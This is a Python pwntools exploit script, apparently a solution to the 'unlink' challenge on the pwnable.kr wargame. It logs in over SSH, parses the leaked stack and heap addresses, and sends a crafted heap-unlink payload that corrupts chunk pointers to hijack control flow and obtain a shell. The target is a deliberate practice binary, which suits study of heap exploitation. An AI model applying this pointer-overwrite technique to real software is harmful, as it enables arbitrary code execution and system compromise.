

from pwn import *
context(log_level="debug")
s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
p = s.process("./unlink")

p.recvuntil("here is stack address leak: ")
stack_addr_leak = int(p.recv(10),16)
p.recvuntil("here is heap address leak: ")
heap_addr_leak = int(p.recv(9),16)

p.recvuntil("now that you have leaks, get shell!\n")


payload  = b'AAAA'           # A+0x8
payload += p32(0x080484eb)  # A+0xc
payload += b'A'*8           # padding
payload += p32(stack_addr_leak + 0xc) # B fd
payload += p32(heap_addr_leak + 0x10) # B bk

p.sendline(payload)
p.sendline('ls')
p.interactive()